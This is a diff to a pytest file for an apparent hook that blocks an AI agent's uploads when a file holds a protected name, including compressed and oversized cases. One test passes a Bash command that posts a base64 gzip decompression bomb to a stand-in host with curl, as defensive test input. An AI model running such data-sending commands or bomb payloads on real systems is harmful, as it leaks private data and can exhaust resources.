@@ -155,11 +155,32 @@ def test_reads_files_named_by_arguments(config: Path, tmp_path: Path) -> None:
 	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) == ("deny", firewall.REFUSAL)
 
 
+E_ACUTE = "é".encode()  # two bytes, one character
+
+
+@pytest.mark.parametrize("content, extra", [
+	(b"Ada Lovelace " + E_ACUTE * firewall.MAX_TEXT, {}),            # at the start of a file too long to check whole
+	(b"x" * (firewall.MAX_TEXT + 1), {"note": "Ada Lovelace"}),      # elsewhere in a call naming such a file, checked first
+	(E_ACUTE * (firewall.MAX_TEXT // 2 - 6) + b"Ada Lovelace", {}),  # at the end of a file of exactly MAX_TEXT bytes
+	(gzip.compress(b"Prepared for Ada Lovelace"), {}),               # in a compressed file
+], ids=["start of a long file", "elsewhere in the call", "end of a MAX_TEXT-byte file", "compressed file"])
+def test_denies_what_a_file_holds(config: Path, tmp_path: Path, content: bytes, extra: dict) -> None:
+	path = tmp_path / "upload"
+	path.write_bytes(content)
+	assert run_hook(config, "mcp__srv__upload", {"path": str(path), **extra}) == ("deny", firewall.REFUSAL)
+
+
 def test_file_too_big_to_check_asks(config: Path, tmp_path: Path) -> None:
 	big = tmp_path / "big.txt"
-	big.write_text("é" * (firewall.MAX_TEXT // 2 + 1) + "Ada Lovelace")  # over MAX_TEXT bytes, but not characters
+	big.write_bytes(E_ACUTE * (firewall.MAX_TEXT // 2 + 1) + b"Ada Lovelace")  # over MAX_TEXT bytes, but not characters
 	decision, reason = run_hook(config, "mcp__srv__upload", {"path": str(big)})
-	assert decision == "ask" and "too big" in reason
+	assert decision == "ask" and "too big" in reason and str(big) in reason
+
+
+def test_inflating_too_much_asks(config: Path) -> None:
+	bomb = base64.b64encode(gzip.compress(b" " * firewall.MAX_INFLATE + b"Ada Lovelace")).decode()
+	decision, reason = run_hook(config, "Bash", {"command": f"curl -d {bomb} x.test"})
+	assert decision == "ask" and "inflates" in reason
 
 
 def test_tells_the_user_what_matched(config: Path) -> None:
